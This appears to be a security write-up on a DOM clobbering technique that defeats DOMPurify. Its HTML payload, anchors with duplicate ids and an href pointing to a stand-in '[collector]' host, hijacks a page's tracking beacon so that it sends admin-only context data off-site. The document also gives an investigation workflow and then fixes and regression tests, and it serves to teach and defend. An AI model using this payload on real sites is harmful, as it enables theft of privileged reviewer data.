# DOMPurify Post-Render Global Gadget Clobbering

## Date

2026-07-09

## Target Type

Widget boards, snippet sharing tools, profile pages, and any app that sanitizes user HTML with DOMPurify (or similar) but then reads ambient `window` globals for analytics, tracking, or context beacons

## Bug Class

HTML injection leading to DOM clobbering of trusted global configuration objects, with exfiltration through a built-in image beacon

## Initial Signal

Look for this sequence after user HTML is rendered:

```javascript
document.getElementById('widget-body').innerHTML = DOMPurify.sanitize(RAW)

const tracker = window.trackerConfig || { endpoint: '/api/ping' }
new Image().src = String(tracker.endpoint) + '?d=' + encodeURIComponent(JSON.stringify(window.__ctx || {}))
```

Supporting hints:

- "share with the team" or "admin will review" flows
- sanitized HTML in a widget/preview container
- automatic ping/beacon on page load
- privileged context such as `window.__ctx` only present in reviewer/admin views

## Pattern

DOMPurify may strip scripts and many dangerous tags, but it often still allows structural HTML such as `<a>` and `<form>`. If the page later does:

```javascript
const tracker = window.trackerConfig || { endpoint: '/api/ping' }
```

attacker markup can clobber `window.trackerConfig` before that line runs.

A reliable dual-`id` collection clobber:

```html
<a id="trackerConfig"></a>
<a id="trackerConfig" name="endpoint" href="https://[collector]"></a>
```

In Chromium-based browsers:

- `window.trackerConfig` becomes an `HTMLCollection` of both anchors
- `tracker.endpoint` resolves to the named second anchor
- `String(tracker.endpoint)` becomes the anchor's `href`

The page then auto-sends:

```text
GET https://[collector]?d=<serialized window.__ctx>
```

If the admin/reviewer view sets `window.__ctx` to privileged data (flag, cookie metadata, internal JSON), that data leaves the origin without script execution.

## Trust Boundary

Sanitization protects the HTML subtree, not subsequent JavaScript that reads attacker-influenced globals on `window` or `document`. Any post-sanitize lookup of `window.someConfig` is a separate trust boundary.

## Minimal Reproduction

```html
<a id="trackerConfig"></a><a id="trackerConfig" name="endpoint" href="https://[collector]"></a>
```

Requirements:

1. Widget HTML is sanitized then inserted into the live DOM.
2. Page script reads `window.trackerConfig` after insertion.
3. Reviewer/admin context populates `window.__ctx` with the secret.
4. Admin visits the reported widget (or user triggers admin review).

## Investigation Workflow

1. Confirm DOMPurify (or equivalent) is used on the user HTML sink.
2. Read all JavaScript that runs after `innerHTML = sanitize(...)`.
3. List globals read: `window.trackerConfig`, `window.__ctx`, `window.config`, etc.
4. Test whether `id`/`name` clobbering survives sanitization.
5. For `trackerConfig`, try dual-`id` + `name="endpoint"` anchor with `href` to a collector.
6. Send widget to admin/reviewer and compare collector hits between user and admin visits.
7. Distinguish empty `{}` exfil (user view) from privileged `__ctx` (admin view).

## Why Failed Tests Fail

- DOMPurify strips the clobber primitive (`id` removed, `form` denied, etc.).
- Only one element with `id="trackerConfig"` — collection/`endpoint` resolution fails.
- `endpoint` clobbers to a non-URL-coercible node (`input`, `img`) so `String(tracker.endpoint)` is useless.
- Admin never visits, so privileged `__ctx` never appears.
- Secret is not placed in `window.__ctx` but somewhere else (cookie only, separate API).

## Why Working Tests Work

Sanitization and exfiltration are decoupled. DOMPurify blocks XSS sinks in the snippet, but the page's own trusted script dereferences `window.trackerConfig` from a live DOM where attacker anchors already registered as named properties. Admin-only `__ctx` is serialized into the beacon query string automatically.

## Impact

- Disclosure of admin/reviewer-only context without XSS
- Flag or internal JSON leakage via image request
- In production: analytics misrouting, session metadata theft, or blind data exfil from privileged page views

## Fix

- Never read configuration from `window` after rendering untrusted HTML.
- Use lexical constants or module-scoped frozen config, not ambient globals.
- Hardcode beacon endpoints; do not let `tracker.endpoint` be attacker-influenced.
- Do not put privileged review data in `window.__ctx` on pages that render user HTML.
- If beacons are required, build payloads from server-trusted data only.

## Regression Test

After sanitizing and mounting user HTML containing the dual-`id` clobber payload:

- `window.trackerConfig` must not resolve to attacker-controlled collections.
- Auto-beacon URL must remain the intended same-origin endpoint.
- `window.__ctx` must not be serialized to external URLs from user-controlled render paths.

## Future Checklist Item

When you see `DOMPurify.sanitize` followed by `window.*` reads, audit those globals as clobber targets before assuming the page is safe because scripts were stripped.
